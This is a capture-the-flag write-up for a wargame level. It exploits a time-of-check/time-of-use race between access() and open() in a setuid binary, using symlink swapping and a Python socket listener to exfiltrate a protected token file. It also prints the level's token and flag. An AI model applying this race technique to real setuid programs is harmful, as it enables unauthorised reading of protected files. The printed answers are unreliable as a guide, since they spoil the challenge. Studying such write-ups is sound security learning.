# Level10

## Solution

We have an executable and a file named ``token``.

```
$ ls -l
total 16
-rwsr-sr-x+ 1 flag10 level10 10817 Mar  5  2016 level10
-rw-------  1 flag10 flag10     26 Mar  5  2016 token
```

Thanks to this site, we can get an idea of the code contained in the executable file.
</br>
<<https://dogbolt.org/>>

```
scp -P 4242 level10@192.168.56.101:/home/user/level10/level10 .
```

```
...
	printf("%s file host\n\tsends file to host if you have access to it\n");
...
if (!access(a1[1], 4))
	...
	printf("Connecting to %s:6969 .. ");
	...
	v3 = open(v0, 0, 8);
	...
	v4 = read(v3, &v5, 0x1000);
...
```

This code shows that the program takes a file and an IP address as parameters to return the file's content on port 6969.
</br>
First, we will create a Python server to receive the token content.

```
$ cd /tmp
$ vim script.py
$ chmod +x ./script.py
$ python ./script.py
```

```
$ ./level10 /tmp/script.py 192.168.56.101
Connecting to 192.168.56.101:6969 .. Connected!
Sending file .. wrote file!
```

It works well; we receive the file contents if we have the rights.

```
.*( )*.
#!/usr/bin/python3

import socket

s = socket.socket(soc
ket.AF_INET, socket.SOCK_STREAM)
s.bind(('0.0.0.0', 6969))
s.lis
ten(1)
conn, addr = s.accept()
while True:
	data = conn.recv(64)

	if not data:
		break
	print(data.decode(errors='ignore'))
```

We can also see that in the code, it uses ``access`` to check permissions, then ``open``. We can use this to our advantage to modify the file in the meantime.

```
$ cd /tmp
$ vim script.sh
$ chmod +x ./script.sh
$ ./script.sh
```

This first script modifies the target file using “ln -sf”.

```
$ cd /tmp
$ vim script2.sh
$ chmod +x ./script2.sh
$ ./script2.sh
```

The second spam the execution of the executable level10.

```
$ python script.py
.*( )*.

.*( )*.

.*( )*.

.*( )*.

.*( )*.

woupa2yuojeeaaed06riuj63c

.*( )*.
```

And now, by running the three scripts, we finally see the token on the server.

```
$ su flag10
Password: woupa2yuojeeaaed06riuj63c
Don't forget to launch getflag !
$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```